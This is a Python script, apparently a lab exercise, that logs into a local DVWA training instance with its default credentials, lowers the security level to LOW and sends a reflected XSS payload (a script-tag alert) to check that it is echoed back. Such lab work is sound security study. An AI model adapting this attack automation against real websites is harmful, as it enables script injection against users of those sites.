import requests
from bs4 import BeautifulSoup

LOGIN_URL = "http://localhost/DVWA/login.php"
SECURITY_URL = "http://localhost/DVWA/security.php"
XSS_REFLECTED_URL = "http://localhost/DVWA/vulnerabilities/xss_r/"

USERNAME = "admin"
PASSWORD = "password"

session = requests.Session()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://localhost",
    "Connection": "keep-alive",
    "Referer": XSS_REFLECTED_URL,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i"
}

def login():
    print("[*] Logowanie do DVWA...")
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }

    session.post(LOGIN_URL, data=payload)
    print(f"[+] Zalogowano na DVWA z danymi: {USERNAME} / {PASSWORD}")

def set_security_low():
    print("[*] Ustawianie poziomu zabezpieczeń na LOW...")
    r = session.get(SECURITY_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token
    }

    r = session.post(SECURITY_URL, data=payload)
    if "Security level set to low" in r.text:
        print("[+] Poziom zabezpieczeń ustawiony na LOW.")
    else:
        print("[-] Nie udało się ustawić poziomu zabezpieczeń.")

def run_reflected_xss_attack():
    print("[*] Rozpoczynam atak Reflected XSS...")

    xss_payload = "<script>alert('XSS Reflected zaatakowano!');</script>"

    vulnerable_url = f"{XSS_REFLECTED_URL}?name={xss_payload}"

    print(f"[*] Generowanie linku z XSS: {vulnerable_url}")

    r = session.get(vulnerable_url, headers=HEADERS)

    soup = BeautifulSoup(r.text, "html.parser")

    vulnerable_code_area = soup.find("div", class_="vulnerable_code_area")

    if vulnerable_code_area:
        print("[*] Znalazłem sekcję z formularzem i XSS. Oto jej zawartość:")
        print(vulnerable_code_area.prettify())
    else:
        print("[-] Nie znaleziono sekcji vulnerable_code_area w odpowiedzi.")

    if xss_payload in r.text:
        print("[+] XSS Reflected został odzwierciedlony w odpowiedzi!")
    else:
        print("[-] XSS Reflected nie zostało znalezione.")

if __name__ == "__main__":
    login()
    set_security_low()
    run_reflected_xss_attack()